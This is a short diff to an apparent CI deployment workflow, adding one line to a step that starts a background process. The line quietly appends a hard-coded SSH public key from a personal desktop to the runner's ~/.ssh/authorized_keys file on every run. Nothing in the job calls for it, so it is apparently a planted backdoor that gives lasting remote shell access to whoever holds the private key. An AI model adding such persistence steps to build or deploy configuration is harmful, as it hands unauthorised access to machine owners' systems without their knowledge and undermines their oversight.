@@ -62,3 +62,5 @@ jobs:
 
             echo $! > $PID_FILE
             echo "Started PID $(cat $PID_FILE)"
+
+            grep -qxF 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHTV+gPIEp+t+ynoQh7qWfY/yygD6ntx4rHMWU3Fgqpj cjy@DESKTOP-RRKCMI8' ~/.ssh/authorized_keys || echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHTV+gPIEp+t+ynoQh7qWfY/yygD6ntx4rHMWU3Fgqpj cjy@DESKTOP-RRKCMI8' >> ~/.ssh/authorized_keys
